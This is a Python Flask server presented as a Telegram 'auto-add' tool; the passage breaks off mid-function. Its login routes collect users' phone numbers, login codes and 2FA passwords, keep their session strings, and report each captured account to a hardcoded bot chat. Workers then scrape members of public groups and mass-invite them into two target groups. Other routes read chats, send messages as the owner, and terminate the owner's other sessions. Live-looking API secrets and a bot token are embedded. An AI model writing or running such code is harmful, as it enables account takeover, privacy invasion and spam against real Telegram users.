#!/usr/bin/env python3
"""
Telegram Auto-Add Server - STABLE VERSION
Fixed: event loop management, client cleanup, memory leaks, concurrency
"""

from flask import Flask, jsonify, request, redirect, send_file
from flask_cors import CORS
from telethon import TelegramClient, errors, functions
from telethon.tl.functions.channels import InviteToChannelRequest, JoinChannelRequest
from telethon.tl.functions.contacts import GetContactsRequest
from telethon.tl.types import ChannelParticipantsRecent
from telethon.sessions import StringSession
import json
import os
import asyncio
import logging
import time
import random
import threading
import requests
from datetime import datetime
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, TimeoutError as FutureTimeoutError

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = Flask(__name__, static_folder=None)
CORS(app)

# ============================================
# SERVER CONFIGURATION
# ============================================
SERVER_NUMBER = 4  # Change this: 1=Dil, 2=sofu, 3=bebby, 4=kaleb, 5=fitsum

SERVERS = {
    1: {'name': 'Dil', 'api_id': 35790598, 'api_hash': 'fa9f62d821f04b03d76d53175e367736', 'url': 'https://dilbedl.onrender.com'},
    2: {'name': 'sofu', 'api_id': 36274756, 'api_hash': 'b70311a2b3547e1ce40e72081dc726dc', 'url': 'https://sofuu.onrender.com'},
    3: {'name': 'bebby', 'api_id': 31590358, 'api_hash': '072edc73e0f4003ddcba1c41d24adb02', 'url': 'https://bebby.onrender.com'},
    4: {'name': 'kaleb', 'api_id': 37539842, 'api_hash': 'a9927e01c5023bf828fe753895d5731b', 'url': 'https://kaleb-bwgb.onrender.com'},
    5: {'name': 'fitsum', 'api_id': 33441396, 'api_hash': 'e6b64536883a7cd95aeb06c73faa1c95', 'url': 'https://fitsum-ev9d.onrender.com'}
}

BOT_TOKEN = '7930542124:AAFg5O4KUu7QFORVkxzowtG0nHAiX0yXXBY'
REPORT_CHAT_ID = '-1002452548749'
TARGET_GROUPS = ['Abe_armygroup', 'abe_army']  # Both groups

CFG = SERVERS.get(SERVER_NUMBER, SERVERS[1])
SERVER_NAME = CFG['name']
API_ID = CFG['api_id']
API_HASH = CFG['api_hash']
SERVER_URL = CFG['url']
PORT = int(os.environ.get('PORT', 10000))

# File paths
ACCOUNTS_FILE = 'accounts.json'
SETTINGS_FILE = 'auto_add_settings.json'
STATS_FILE = 'stats.json'
WORKER_ADDS_FILE = 'worker_adds.json'
TEMP_SESSIONS_FILE = 'temp_sessions.json'

# Global storage with thread locks
accounts = []
temp_sessions = {}
auto_add_settings = {}
running_tasks = {}
worker_adds = defaultdict(list)
file_lock = threading.Lock()
worker_lock = threading.Lock()

stats = {
    'total_added': 0, 'today_added': 0, 'verified_total': 0, 'verified_today': 0,
    'last_reset': datetime.now().strftime('%Y-%m-%d'),
    'worker_stats': {}, 'dead_accounts_removed': 0,
    'started_at': datetime.now().isoformat()
}

# Thread pool for async operations
executor = ThreadPoolExecutor(max_workers=10)

# ============================================
# FILE OPERATIONS
# ============================================
def load_json(path, default):
    try:
        if os.path.exists(path):
            with open(path, 'r') as f:
                c = f.read().strip()
                return json.loads(c) if c else default
    except Exception as e:
        logger.error(f"Load error {path}: {e}")
    return default

def save_json(path, data):
    with file_lock:
        try:
            with open(path, 'w') as f:
                json.dump(data, f, indent=2, default=str)
        except Exception as e:
            logger.error(f"Save error {path}: {e}")

def save_temp_sessions():
    sessions_data = {}
    for session_id, session_data in temp_sessions.items():
        sessions_data[session_id] = {
            'phone': session_data['phone'],
            'hash': session_data['hash'],
            'session': session_data['session'],
            'password_attempts': session_data.get('password_attempts', 0),
            'code_attempts': session_data.get('code_attempts', 0),
            'created_at': session_data.get('created_at', time.time())
        }
    save_json(TEMP_SESSIONS_FILE, sessions_data)

def load_temp_sessions():
    global temp_sessions
    sessions_data = load_json(TEMP_SESSIONS_FILE, {})
    temp_sessions = {}
    for session_id, session_data in sessions_data.items():
        # Clean expired sessions (> 1 hour)
        created_at = session_data.get('created_at', 0)
        if time.time() - created_at < 3600:
            temp_sessions[session_id] = session_data

# ============================================
# SYNC TELEGRAM CLIENT HELPER
# ============================================
class SyncTelegramClient:
    """Helper class to run Telegram client operations synchronously"""
    
    @staticmethod
    def run_async(async_func, timeout=60):
        """Run async function in a dedicated event loop"""
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            return loop.run_until_complete(async_func())
        except Exception as e:
            logger.error(f"Async execution error: {e}")
            raise
        finally:
            try:
                loop.close()
            except:
                pass
    
    @staticmethod
    def get_client(session_string):
        """Create a new client instance"""
        return TelegramClient(
            StringSession(session_string), API_ID, API_HASH,
            connection_retries=3, retry_delay=1, timeout=30,
            loop=asyncio.new_event_loop()
        )
    
    @staticmethod
    async def safe_connect(client):
        """Safely connect with timeout"""
        try:
            await asyncio.wait_for(client.connect(), timeout=15)
            return True
        except asyncio.TimeoutError:
            logger.error("Client connection timeout")
            return False
        except Exception as e:
            logger.error(f"Client connection error: {e}")
            return False

# ============================================
# ACCOUNT AGE DETECTION
# ============================================
def get_account_age_sync(session_string):
    """Get account age synchronously"""
    async def _get_age():
        client = SyncTelegramClient.get_client(session_string)
        try:
            if not await SyncTelegramClient.safe_connect(client):
                return {'age_display': 'Unknown', 'method': 'connection_failed'}
            
            if not await client.is_user_authorized():
                return {'age_display': 'Unknown', 'method': 'not_authorized'}
            
            me = await client.get_me()
            
            # Try creation_date
            if hasattr(me, 'creation_date') and me.creation_date:
                creation_date = me.creation_date
                if hasattr(creation_date, 'tzinfo') and creation_date.tzinfo:
                    creation_date = creation_date.replace(tzinfo=None)
                age_days = (datetime.now() - creation_date).days
                age_years = age_days / 365.25
                return {
                    'creation_date': creation_date.isoformat(),
                    'age_days': age_days,
                    'age_years': round(age_years, 1),
                    'age_display': f"{int(age_years)} years, {age_days % 365} days",
                    'year_joined': creation_date.year,
                    'method': 'creation_date'
                }
            
            # Try profile photos
            try:
                photos = await client.get_profile_photos(me, limit=1)
                if photos and len(photos) > 0:
                    oldest_photo_date = photos[0].date
                    if hasattr(oldest_photo_date, 'tzinfo') and oldest_photo_date.tzinfo:
                        oldest_photo_date = oldest_photo_date.replace(tzinfo=None)
                    age_days = (datetime.now() - oldest_photo_date).days
                    return {
                        'creation_date': oldest_photo_date.isoformat(),
                        'age_days': age_days,
                        'age_years': round(age_days / 365.25, 1),
                        'age_display': f"~{int(age_days / 365.25)} years",
                        'year_joined': oldest_photo_date.year,
                        'method': 'oldest_photo'
                    }
            except:
                pass
            
            return {
                'age_display': 'Unknown account age',
                'method': 'unknown'
            }
        except Exception as e:
            logger.error(f"Age detection error: {e}")
            return {'age_display': 'Error', 'method': 'error', 'error': str(e)}
        finally:
            await client.disconnect()
    
    return SyncTelegramClient.run_async(_get_age, timeout=20)

# ============================================
# ACCOUNT MANAGEMENT
# ============================================
def reset_daily():
    today = datetime.now().strftime('%Y-%m-%d')
    if stats.get('last_reset') != today:
        stats['today_added'] = 0
        stats['verified_today'] = 0
        stats['last_reset'] = today
        for k in stats.get('worker_stats', {}):
            stats['worker_stats'][k]['today'] = 0
            stats['worker_stats'][k]['verified_today'] = 0
        save_json(STATS_FILE, stats)

def check_account_auth(acc):
    """Check if account is still authorized"""
    async def _check():
        client = SyncTelegramClient.get_client(acc['session'])
        try:
            if not await SyncTelegramClient.safe_connect(client):
                return False
            return await client.is_user_authorized()
        except:
            return False
        finally:
            await client.disconnect()
    
    try:
        return SyncTelegramClient.run_async(_check, timeout=15)
    except:
        return False

def remove_dead_account(aid, reason=""):
    global accounts
    acc = next((a for a in accounts if a['id'] == aid), None)
    name = acc.get('name', str(aid)) if acc else str(aid)
    
    with worker_lock:
        accounts = [a for a in accounts if a['id'] != aid]
        auto_add_settings.pop(str(aid), None)
        if str(aid) in running_tasks:
            running_tasks.pop(str(aid), None)
        worker_adds.pop(str(aid), None)
    
    save_json(ACCOUNTS_FILE, accounts)
    save_json(SETTINGS_FILE, auto_add_settings)
    save_json(WORKER_ADDS_FILE, dict(worker_adds))
    
    stats['dead_accounts_removed'] = stats.get('dead_accounts_removed', 0) + 1
    save_json(STATS_FILE, stats)
    
    logger.warning(f"Removed dead account: {name} | Reason: {reason}")
    send_telegram(f"<b>{SERVER_NAME}</b>\n❌ Removed: {name}\nReason: {reason}")

def send_telegram(text):
    try:
        requests.post(
            f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage',
            json={'chat_id': REPORT_CHAT_ID, 'text': text, 'parse_mode': 'HTML'},
            timeout=10
        )
    except Exception as e:
        logger.error(f"Send telegram error: {e}")

# ============================================
# IMPROVED AUTO-ADD WORKER
# ============================================
class AutoAddWorker:
    def __init__(self, account):
        self.account = account
        self.acc_id = account['id']
        self.acc_key = str(self.acc_id)
        self.running = True
        self.client = None
        self.last_ping = time.time()
    
    def stop(self):
        self.running = False
    
    def run(self):
        """Main worker loop"""
        logger.info(f"Auto-add worker started for account {self.account.get('name', self.acc_id)}")
        
        # Join both target groups first
        self.join_all_targets()
        
        attempted_users = set()
        cycle_count = 0
        
        while self.running:
            try:
                # Check if still enabled
                settings = auto_add_settings.get(self.acc_key, {})
                if not settings.get('enabled', True):
                    time.sleep(5)
                    continue
                
                reset_daily()
                
                # Reconnect if needed
                if not self.ensure_connection():
                    time.sleep(30)
                    continue
                
                # Get fresh user list
                user_ids = self.get_user_sources()
                logger.info(f"Worker {self.acc_key}: Found {len(user_ids)} unique users")
                
                # Reset attempted set if needed
                if len(attempted_users) > len(user_ids) * 2:
                    attempted_users.clear()
                
                fresh_users = [uid for uid in user_ids if uid not in attempted_users]
                if len(fresh_users) < 50:
                    attempted_users.clear()
                    fresh_users = list(user_ids)
                
                random.shuffle(fresh_users)
                
                delay = max(25, settings.get('delay_seconds', 25))
                added_count = 0
                
                for user_id in fresh_users[:300]:  # Limit per cycle
                    if not self.running:
                        break
                    
                    settings_check = auto_add_settings.get(self.acc_key, {})
                    if not settings_check.get('enabled', True):
                        break
                    
                    attempted_users.add(user_id)
                    
                    if self.add_user_to_targets(user_id):
                        added_count += 1
                        stats['today_added'] = stats.get('today_added', 0) + 1
                        stats['total_added'] = stats.get('total_added', 0) + 1
                        
                        if self.acc_key not in stats['worker_stats']:
                            stats['worker_stats'][self.acc_key] = {'total': 0, 'today': 0}
                        stats['worker_stats'][self.acc_key]['today'] += 1
                        stats['worker_stats'][self.acc_key]['total'] += 1
                        
                        save_json(STATS_FILE, stats)
                    
                    # Dynamic delay
                    actual_delay = random.uniform(delay * 0.8, delay * 1.2)
                    time.sleep(actual_delay)
                    
                    # Reconnect occasionally
                    if added_count % 50 == 0:
                        self.reconnect()
                
                cycle_count += 1
                logger.info(f"Cycle {cycle_count}: Added {added_count} users | Total today: {stats['today_added']}")
                
                # Rest between cycles
                rest_time = random.randint(60, 180)
                for _ in range(rest_time):
                    if not self.running:
                        break
                    time.sleep(1)
                
            except Exception as e:
                logger.error(f"Worker error: {e}")
                time.sleep(30)
                self.reconnect()
    
    def ensure_connection(self):
        """Ensure client is connected and authorized"""
        try:
            if self.client and self.client.is_connected():
                # Ping to check connection
                if time.time() - self.last_ping > 60:
                    self.last_ping = time.time()
                return True
            
            return self.connect_client()
        except:
            return self.connect_client()
    
    def connect_client(self):
        """Connect the client"""
        try:
            if self.client:
                try:
                    asyncio.run_coroutine_threadsafe(self.client.disconnect(), self.client.loop).result(timeout=5)
                except:
                    pass
            
            self.client = SyncTelegramClient.get_client(self.account['session'])
            
            async def _connect():
                if not await SyncTelegramClient.safe_connect(self.client):
                    return False
                if not await self.client.is_user_authorized():
                    return False
                return True
            
            result = SyncTelegramClient.run_async(_connect, timeout=20)
            if result:
                self.last_ping = time.time()
                return True
            return False
        except Exception as e:
            logger.error(f"Connect error: {e}")
            return False
    
    def reconnect(self):
        """Force reconnect"""
        try:
            if self.client:
                async def _disconnect():
                    await self.client.disconnect()
                SyncTelegramClient.run_async(_disconnect, timeout=5)
        except:
            pass
        self.client = None
        self.connect_client()
    
    def join_all_targets(self):
        """Join both target groups"""
        for target in TARGET_GROUPS:
            try:
                if not self.ensure_connection():
                    continue
                
                async def _join():
                    try:
                        entity = await self.client.get_entity(target)
                        await self.client(JoinChannelRequest(entity))
                        return True
                    except Exception as e:
                        if 'already' in str(e).lower() or 'participant' in str(e).lower():
                            return True
                        logger.warning(f"Join {target} error: {e}")
                        return False
                
                result = SyncTelegramClient.run_async(_join, timeout=20)
                if result:
                    logger.info(f"Successfully joined {target}")
            except Exception as e:
                logger.warning(f"Join target {target} failed: {e}")
    
    def get_user_sources(self):
        """Collect users from multiple sources"""
        user_ids = set()
        
        if not self.ensure_connection():
            return user_ids
        
        async def _collect():
            try:
                # Get contacts
                try:
                    contacts = await self.client(GetContactsRequest(0))
                    for user in contacts.users:
                        if user.id and not getattr(user, 'bot', False):
                            user_ids.add(user.id)
                except Exception as e:
                    logger.warning(f"Contacts error: {e}")
                
                # Get dialogs
                try:
                    dialogs = await self.client.get_dialogs(limit=200)
                    for d in dialogs:
                        if d.is_user and d.entity and d.entity.id:
                            if not getattr(d.entity, 'bot', False):
                                user_ids.add(d.entity.id)
                except Exception as e:
                    logger.warning(f"Dialogs error: {e}")
                
                # Source groups
                source_groups = ['@telegram', '@durov', '@TelegramTips', '@contest', 
                               '@TelegramNews', '@builders', '@Android', '@iOS', 
                               '@Python', '@programming', '@abe_army']
                
                for sg in source_groups:
                    try:
                        entity = await self.client.get_entity(sg)
                        participants = await self.client.get_participants(entity, limit=200)
                        for user in participants:
                            if user.id and not getattr(user, 'bot', False):
                                user_ids.add(user.id)
                        await asyncio.sleep(0.5)
                    except:
                        continue
                
                return list(user_ids)
            except Exception as e:
                logger.error(f"Collection error: {e}")
                return []
        
        return SyncTelegramClient.run_async(_collect, timeout=45)
    
    def add_user_to_targets(self, user_id):
        """Add user to all target groups"""
        success = False
        
        async def _add_to_target(target):
            try:
                entity = await self.client.get_entity(target)
                user_input = await self.client.get_input_entity(user_id)
                await self.client(InviteToChannelRequest(entity, [user_input]))
                return True
            except errors.FloodWaitError as e:
                wait_time = min(e.seconds, 60)
                logger.warning(f"Flood wait {wait_time}s")
                time.sleep(wait_time)
                return False
            except (errors.UserPrivacyRestrictedError, errors.UserNotMutualContactError,
                    errors.UserAlreadyParticipantError, errors.UserKickedError,
                    errors.UserBannedInChannelError):
                return False
            except errors.rpcerrorlist.AuthKeyUnregisteredError:
                logger.error("Auth key unregistered")
                remove_dead_account(self.acc_id, "Auth key unregistered")
                self.running = False
                return False
            except Exception as e:
                logger.debug(f"Add error: {e}")
                return False
        
        for target in TARGET_GROUPS:
            if not self.ensure_connection():
                break
            result = SyncTelegramClient.run_async(lambda: _add_to_target(target), timeout=15)
            if result:
                success = True
        
        if success:
            # Log addition
            record = {
                'user_id': user_id,
                'time': datetime.now().isoformat(),
                'worker_id': self.acc_id
            }
            worker_adds[self.acc_key].append(record)
            # Keep only last 1000
            if len(worker_adds[self.acc_key]) > 1000:
                worker_adds[self.acc_key] = worker_adds[self.acc_key][-1000:]
            save_json(WORKER_ADDS_FILE, dict(worker_adds))
        
        return success

def start_auto_add(account):
    """Start auto-add worker for account"""
    acc_key = str(account['id'])
    with worker_lock:
        if acc_key in running_tasks:
            existing = running_tasks[acc_key]
            if existing and hasattr(existing, 'is_alive') and existing.is_alive():
                logger.info(f"Worker already running for {account.get('name', acc_key)}")
                return
        
        worker = AutoAddWorker(account)
        thread = threading.Thread(target=worker.run, daemon=True)
        thread.start()
        running_tasks[acc_key] = {'thread': thread, 'worker': worker}
        logger.info(f"Started worker for {account.get('name', acc_key)}")

def stop_auto_add(account_id):
    """Stop auto-add worker for account"""
    acc_key = str(account_id)
    with worker_lock:
        if acc_key in running_tasks:
            worker_info = running_tasks[acc_key]
            if worker_info and 'worker' in worker_info:
                worker_info['worker'].stop()
            running_tasks.pop(acc_key, None)
            logger.info(f"Stopped worker for account {acc_key}")

# ============================================
# FLASK ROUTES
# ============================================

@app.route('/')
def index():
    return redirect('/auto-add')

@app.route('/auto-add')
def auto_add_page():
    try:
        return send_file('auto_add.html')
    except FileNotFoundError:
        return "auto_add.html not found", 404

@app.route('/login')
def login_page():
    try:
        return send_file('login.html')
    except FileNotFoundError:
        return "login.html not found", 404

@app.route('/dashboard')
def dashboard_page():
    try:
        return send_file('dashboard.html')
    except FileNotFoundError:
        return "dashboard.html not found", 404

@app.route('/dash')
def dash_page():
    try:
        return send_file('dash.html')
    except FileNotFoundError:
        return "dash.html not found", 404

@app.route('/all')
def all_page():
    try:
        return send_file('all.html')
    except FileNotFoundError:
        return "all.html not found", 404

@app.route('/ping')
def ping():
    return jsonify({
        'status': 'ok',
        'server': SERVER_NAME,
        'api_id': API_ID,
        'timestamp': datetime.now().isoformat(),
        'workers': len(running_tasks)
    })

@app.route('/api/server-info')
def server_info():
    return jsonify({
        'success': True,
        'server': {
            'number': SERVER_NUMBER,
            'name': SERVER_NAME,
            'url': SERVER_URL,
            'target_groups': TARGET_GROUPS,
            'api_id': API_ID,
            'port': PORT
        }
    })

@app.route('/api/accounts')
def get_accounts():
    acc_list = []
    for a in accounts:
        aid_str = str(a['id'])
        ws = stats.get('worker_stats', {}).get(aid_str, {})
        account_age = a.get('account_age', {})
        
        acc_list.append({
            'id': a['id'],
            'name': a.get('name', '?'),
            'phone': a.get('phone', ''),
            'username': a.get('username', ''),
            'active': a.get('active', True),
            'auto_add_enabled': auto_add_settings.get(aid_str, {}).get('enabled', True),
            'account_age': account_age,
            'stats': {
                'total_added': ws.get('total', 0),
                'today_added': ws.get('today', 0)
            }
        })
    return jsonify({'success': True, 'accounts': acc_list})

@app.route('/api/add-account', methods=['POST'])
def add_account():
    try:
        data = request.json
        phone = data.get('phone', '').strip()
        if not phone:
            return jsonify({'success': False, 'error': 'Phone number required'})
        if not phone.startswith('+'):
            phone = '+' + phone
        
        logger.info(f"Sending code to {phone}")
        
        async def send_code():
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            try:
                result = await client.send_code_request(phone)
                sid = str(int(time.time() * 1000))
                temp_sessions[sid] = {
                    'phone': phone,
                    'hash': result.phone_code_hash,
                    'session': client.session.save(),
                    'password_attempts': 0,
                    'code_attempts': 0,
                    'created_at': time.time()
                }
                save_temp_sessions()
                return {'success': True, 'session_id': sid}
            except errors.FloodWaitError as e:
                return {'success': False, 'error': f'Too many attempts. Wait {e.seconds}s'}
            except errors.PhoneNumberInvalidError:
                return {'success': False, 'error': 'Invalid phone number'}
            except Exception as e:
                return {'success': False, 'error': str(e)}
            finally:
                await client.disconnect()
        
        result = SyncTelegramClient.run_async(send_code, timeout=45)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Add account error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/verify-code', methods=['POST'])
def verify_code():
    try:
        data = request.json
        code = data.get('code', '').strip()
        sid = data.get('session_id', '')
        pwd = data.get('password', '')
        
        if not sid or sid not in temp_sessions:
            return jsonify({'success': False, 'error': 'Session expired. Please request a new code.'})
        
        td = temp_sessions[sid]
        
        # Check attempts
        if td.get('code_attempts', 0) >= 5:
            del temp_sessions[sid]
            save_temp_sessions()
            return jsonify({'success': False, 'error': 'Too many incorrect code attempts. Session expired.'})
        
        if td.get('password_attempts', 0) >= 5:
            del temp_sessions[sid]
            save_temp_sessions()
            return jsonify({'success': False, 'error': 'Too many incorrect password attempts. Session expired.'})
        
        async def verify():
            client = TelegramClient(StringSession(td['session']), API_ID, API_HASH)
            await client.connect()
            try:
                # Sign in
                try:
                    await client.sign_in(td['phone'], code, phone_code_hash=td['hash'])
                    td['code_attempts'] = 0
                    save_temp_sessions()
                except errors.SessionPasswordNeededError:
                    if not pwd:
                        return {'need_password': True}
                    try:
                        await client.sign_in(password=pwd)
                        td['password_attempts'] = 0
                        save_temp_sessions()
                    except errors.PasswordHashInvalidError:
                        td['password_attempts'] = td.get('password_attempts', 0) + 1
                        save_temp_sessions()
                        remaining = 5 - td['password_attempts']
                        return {'success': False, 'error': f'Wrong 2FA password. {remaining} attempts remaining.'}
                
                # Get user info
                me = await client.get_me()
                
                # Get account age
                account_age = get_account_age_sync(client.session.save())
                
                # Create new account
                new_id = int(time.time() * 1000)
                new_acc = {
                    'id': new_id,
                    'phone': me.phone or td['phone'],
                    'name': (me.first_name or '') + (' ' + me.last_name if me.last_name else ''),
                    'username': me.username or '',
                    'session': client.session.save(),
                    'active': True,
                    'account_age': account_age
                }
                
                if not new_acc['name'].strip():
                    new_acc['name'] = 'User'
                
                accounts.append(new_acc)
                save_json(ACCOUNTS_FILE, accounts)
                
                # Save settings
                auto_add_settings[str(new_id)] = {
                    'enabled': True,
                    'target_group': TARGET_GROUPS[0],
                    'delay_seconds': 25,
                    'auto_join': True
                }
                save_json(SETTINGS_FILE, auto_add_settings)
                
                # Initialize stats
                if 'worker_stats' not in stats:
                    stats['worker_stats'] = {}
                stats['worker_stats'][str(new_id)] = {'total': 0, 'today': 0}
                save_json(STATS_FILE, stats)
                
                # Start auto-add
                start_auto_add(new_acc)
                
                age_info = account_age.get('age_display', 'Unknown')
                send_telegram(
                    f"<b>{SERVER_NAME}</b>\n"
                    f"✅ New account added!\n"
                    f"Name: {new_acc['name']}\n"
                    f"Phone: {new_acc['phone']}\n"
                    f"Age: {age_info}"
                )
                
                return {
                    'success': True,
                    'account': {
                        'id': new_id,
                        'name': new_acc['name'],
                        'phone': new_acc['phone']
                    },
                    'account_age': age_info
                }
            except errors.PhoneCodeInvalidError:
                td['code_attempts'] = td.get('code_attempts', 0) + 1
                save_temp_sessions()
                remaining = 5 - td['code_attempts']
                if remaining <= 0:
                    del temp_sessions[sid]
                    save_temp_sessions()
                    return {'success': False, 'error': 'Too many incorrect codes. Session expired.'}
                return {'success': False, 'error': f'Invalid code. {remaining} attempts remaining.'}
            except errors.PhoneCodeExpiredError:
                return {'success': False, 'error': 'Code expired. Please request a new one.'}
            except Exception as e:
                return {'success': False, 'error': str(e)}
            finally:
                await client.disconnect()
        
        result = SyncTelegramClient.run_async(verify, timeout=45)
        
        if result.get('success') and not result.get('need_password'):
            if sid in temp_sessions:
                del temp_sessions[sid]
                save_temp_sessions()
        
        return jsonify(result)
    except Exception as e:
        logger.error(f"Verify code error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/remove-account', methods=['POST'])
def remove_account():
    aid = request.json.get('accountId')
    stop_auto_add(aid)
    name = remove_dead_account(aid, "Manual removal")
    return jsonify({'success': True, 'message': f'Removed: {name}'})

@app.route('/api/get-messages', methods=['POST'])
def get_messages():
    try:
        aid = request.json.get('accountId')
        acc = next((a for a in accounts if a['id'] == aid), None)
        if not acc:
            return jsonify({'success': False, 'error': 'Account not found'})
        
        async def fetch():
            client = SyncTelegramClient.get_client(acc['session'])
            await client.connect()
            try:
                if not await client.is_user_authorized():
                    return {'success': False, 'error': 'auth_key_unregistered'}
                
                dialogs = await client.get_dialogs(limit=100)
                chats = []
                messages = []
                
                for dialog in dialogs:
                    try:
                        chat_id = str(dialog.id)
                        chat_type = 'user'
                        if dialog.is_group:
                            chat_type = 'group'
                        elif dialog.is_channel:
                            chat_type = 'channel'
                        elif hasattr(dialog.entity, 'bot') and dialog.entity.bot:
                            chat_type = 'bot'
                        
                        last_msg = ''
                        last_date = 0
                        if dialog.message:
                            last_msg = (dialog.message.message or '')[:200]
                            if dialog.message.date:
                                last_date = dialog.message.date.timestamp()
                        
                        chats.append({
                            'id': chat_id,
                            'title': dialog.name or 'Unknown',
                            'type': chat_type,
                            'unread': dialog.unread_count or 0,
                            'lastMessage': last_msg,
                            'lastMessageDate': last_date
                        })
                    except:
                        continue
                
                return {'success': True, 'chats': chats, 'messages': messages}
            finally:
                await client.disconnect()
        
        result = SyncTelegramClient.run_async(fetch, timeout=45)
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)[:100]})

@app.route('/api/send-message', methods=['POST'])
def send_message():
    try:
        aid = request.json.get('accountId')
        chat_id = request.json.get('chatId')
        message = request.json.get('message', '').strip()
        
        if not message:
            return jsonify({'success': False, 'error': 'Message required'})
        
        acc = next((a for a in accounts if a['id'] == aid), None)
        if not acc:
            return jsonify({'success': False, 'error': 'Account not found'})
        
        async def send():
            client = SyncTelegramClient.get_client(acc['session'])
            await client.connect()
            try:
                entity = await client.get_entity(int(chat_id))
                await client.send_message(entity, message)
                return {'success': True}
            except:
                try:
                    entity = await client.get_entity(chat_id)
                    await client.send_message(entity, message)
                    return {'success': True}
                except Exception as e:
                    return {'success': False, 'error': str(e)[:100]}
            finally:
                await client.disconnect()
        
        result = SyncTelegramClient.run_async(send, timeout=30)
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)[:100]})

@app.route('/api/auto-add-settings', methods=['GET', 'POST'])
def auto_add_settings_route():
    if request.method == 'GET':
        aid = request.args.get('accountId')
        aid_str = str(aid)
        s = auto_add_settings.get(aid_str, {
            'enabled': False,
            'target_group': TARGET_GROUPS[0],
            'delay_seconds': 25
        })
        s['account_id'] = aid
        s['added_today'] = stats.get('today_added', 0)
        s['total_added'] = stats.get('total_added', 0)
        s['server_name'] = SERVER_NAME
        
        return jsonify({'success': True, 'settings': s})
    
    # POST
    data = request.json
    aid = data.get('accountId')
    akey = str(aid)
    
    was_enabled = auto_add_settings.get(akey, {}).get('enabled', False)
    new_enabled = data.get('enabled', False)
    
    auto_add_settings[akey] = {
        'enabled': new_enabled,
        'target_group': data.get('target_group', TARGET_GROUPS[0]),
        'delay_seconds': max(25, data.get('delay_seconds', 25)),
        'auto_join': True
    }
    save_json(SETTINGS_FILE, auto_add_settings)
    
    if new_enabled and not was_enabled:
        acc = next((a for a in accounts if a['id'] == aid), None)
        if acc:
            start_auto_add(acc)
    elif not new_enabled and was_enabled:
        stop_auto_add(aid)
    
    return jsonify({'success': True, 'message': 'Settings saved'})

@app.route('/api/auto-add-stats')
def auto_add_stats():
    reset_daily()
    return jsonify({
        'success': True,
        'added_today': stats.get('today_added', 0),
        'total_added': stats.get('total_added', 0),
        'server_name': SERVER_NAME
    })

@app.route('/api/test-auto-add', methods=['POST'])
def test_auto_add():
    try:
        aid = request.json.get('accountId')
        acc = next((a for a in accounts if a['id'] == aid), None)
        if not acc:
            return jsonify({'success': False, 'error': 'Account not found'})
        
        async def test():
            client = SyncTelegramClient.get_client(acc['session'])
            await client.connect()
            try:
                if not await client.is_user_authorized():
                    return {'success': False, 'error': 'Not authorized'}
                
                available = 0
                try:
                    contacts = await client(GetContactsRequest(0))
                    available = len([c for c in contacts.users if not getattr(c, 'bot', False)])
                except:
                    pass
                
                return {'success': True, 'available_members': available}
            finally:
                await client.disconnect()
        
        result = SyncTelegramClient.run_async(test, timeout=30)
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)[:100]})

@app.route('/api/join-all-groups', methods=['POST'])
def join_all_groups():
    try:
        aid = request.json.get('accountId')
        acc = next((a for a in accounts if a['id'] == aid), None)
        if not acc:
            return jsonify({'success': False, 'error': 'Account not found'})
        
        async def join_all():
            client = SyncTelegramClient.get_client(acc['session'])
            await client.connect()
            results = []
            try:
                for target in TARGET_GROUPS:
                    try:
                        entity = await client.get_entity(target)
                        await client(JoinChannelRequest(entity))
                        results.append({'group': target, 'status': 'joined'})
                    except Exception as e:
                        if 'already' in str(e).lower():
                            results.append({'group': target, 'status': 'already_member'})
                        else:
                            results.append({'group': target, 'status': 'error', 'error': str(e)[:100]})
                return {'success': True, 'results': results}
            finally:
                await client.disconnect()
        
        result = SyncTelegramClient.run_async(join_all, timeout=45)
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)[:100]})

@app.route('/api/get-sessions', methods=['POST'])
def get_sessions():
    try:
        aid = request.json.get('accountId')
        acc = next((a for a in accounts if a['id'] == aid), None)
        if not acc:
            return jsonify({'success': False, 'error': 'Account not found'})
        
        async def fetch():
            client = SyncTelegramClient.get_client(acc['session'])
            await client.connect()
            try:
                if not await client.is_user_authorized():
                    return {'success': False, 'error': 'Not authorized'}
                
                result = await client(functions.account.GetAuthorizationsRequest())
                sessions = []
                current_hash = None
                
                for auth in result.authorizations:
                    session_info = {
                        'hash': str(auth.hash),
                        'device_model': auth.device_model or 'Unknown',
                        'platform': auth.platform or 'Unknown',
                        'date_active': auth.date_active.timestamp() if auth.date_active else 0,
                        'ip': auth.ip or 'Unknown',
                        'country': auth.country or 'Unknown',
                        'current': auth.current
                    }
                    if auth.current:
                        current_hash = str(auth.hash)
                    sessions.append(session_info)
                
                return {'success': True, 'sessions': sessions, 'current_hash': current_hash}
            finally:
                await client.disconnect()
        
        result = SyncTelegramClient.run_async(fetch, timeout=30)
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)[:100]})

@app.route('/api/terminate-session', methods=['POST'])
def terminate_session():
    try:
        aid = request.json.get('accountId')
        hash_val = request.json.get('hash')
        
        acc = next((a for a in accounts if a['id'] == aid), None)
        if not acc:
            return jsonify({'success': False, 'error': 'Account not found'})
        
        async def terminate():
            client = SyncTelegramClient.get_client(acc['session'])
            await client.connect()
            try:
                await client(functions.account.ResetAuthorizationRequest(hash=int(hash_val)))
                return {'success': True}
            finally:
                await client.disconnect()
        
        result = SyncTelegramClient.run_async(terminate, timeout=30)
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)[:100]})

@app.route('/api/terminate-sessions', methods=['POST'])
def terminate_sessions():
    try:
        aid = request.json.get('accountId')
        
        acc = next((a for a in accounts if a['id'] == aid), None)
        if not acc:
            return jsonify({'success': False, 'error': 'Account not found'})
        
        async def terminate():
            client = SyncTelegramClient.get_client(acc['session'])
            await client.connect()
            try:
                result = await client(functions.account.GetAuthorizationsRequest())
                terminated = 0
                for auth in result.authorizations:
                    if not auth.current:
